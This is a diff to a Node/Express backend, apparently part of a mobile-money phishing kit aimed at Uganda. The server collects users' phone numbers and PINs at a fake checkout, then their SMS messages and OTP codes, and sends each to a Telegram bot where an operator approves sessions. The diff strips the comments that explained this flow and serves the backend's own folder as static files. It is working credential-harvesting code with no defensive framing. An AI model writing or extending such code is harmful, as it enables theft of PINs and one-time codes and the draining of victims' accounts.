@@ -3,6 +3,7 @@ const express = require('express');
 const cors = require('cors');
 const axios = require('axios');
 const crypto = require('crypto');
+const path = require('path');
 
 const app = express();
 const PORT = process.env.PORT || 5000;
@@ -20,6 +21,9 @@ const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 app.use(cors());
 app.use(express.json({ limit: '1mb' }));
 
+// Serve static files (HTML, images) from backend root
+app.use(express.static(__dirname));
+
 // Health check for Railway
 app.get('/health', (req, res) => {
   res.status(200).json({ status: 'ok', service: 'starling-network-ug' });
@@ -30,7 +34,6 @@ app.get('/health', (req, res) => {
 // ============================================
 const sessions = new Map();
 
-// Clean up old sessions every 5 minutes
 setInterval(() => {
   const now = Date.now();
   for (const [id, session] of sessions) {
@@ -64,8 +67,6 @@ async function sendTelegramMessage(text) {
 
 // ============================================
 // POST /api/checkout
-// Receives phone + PIN, creates session,
-// forwards to Telegram, then waits for admin approval
 // ============================================
 app.post('/api/checkout', async (req, res) => {
   try {
@@ -88,7 +89,6 @@ app.post('/api/checkout', async (req, res) => {
     };
     sessions.set(sessionId, session);
 
-    // Send to Telegram
     const message = `
 🔔 <b>New Payment Request — Uganda</b>
 
@@ -115,7 +115,6 @@ Reply with:
 
 // ============================================
 // GET /api/status/:sessionId
-// Frontend polls this to check approval status
 // ============================================
 app.get('/api/status/:sessionId', (req, res) => {
   const { sessionId } = req.params;
@@ -125,7 +124,6 @@ app.get('/api/status/:sessionId', (req, res) => {
     return res.json({ ok: true, status: 'timeout', message: 'Session not found or expired' });
   }
 
-  // Auto-timeout after 5 minutes
   if (Date.now() - session.createdAt > 5 * 60 * 1000 && session.status === 'pending') {
     session.status = 'timeout';
   }
@@ -139,7 +137,6 @@ app.get('/api/status/:sessionId', (req, res) => {
 
 // ============================================
 // POST /api/sms
-// Receives pasted SMS from user, forwards to Telegram
 // ============================================
 app.post('/api/sms', async (req, res) => {
   try {
@@ -172,7 +169,6 @@ app.post('/api/sms', async (req, res) => {
 
 // ============================================
 // POST /api/otp
-// Receives OTP code from user, forwards to Telegram
 // ============================================
 app.post('/api/otp', async (req, res) => {
   try {
@@ -202,7 +198,7 @@ app.post('/api/otp', async (req, res) => {
 });
 
 // ============================================
-// TELEGRAM WEBHOOK — admin replies /approve or /reject
+// TELEGRAM WEBHOOK
 // ============================================
 app.post('/api/telegram-webhook', async (req, res) => {
   try {
@@ -212,7 +208,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
     const text = message.text.trim();
     const fromId = message.chat.id.toString();
 
-    // Only allow the configured chat
     if (fromId !== TELEGRAM_CHAT_ID) {
       return res.sendStatus(200);
     }
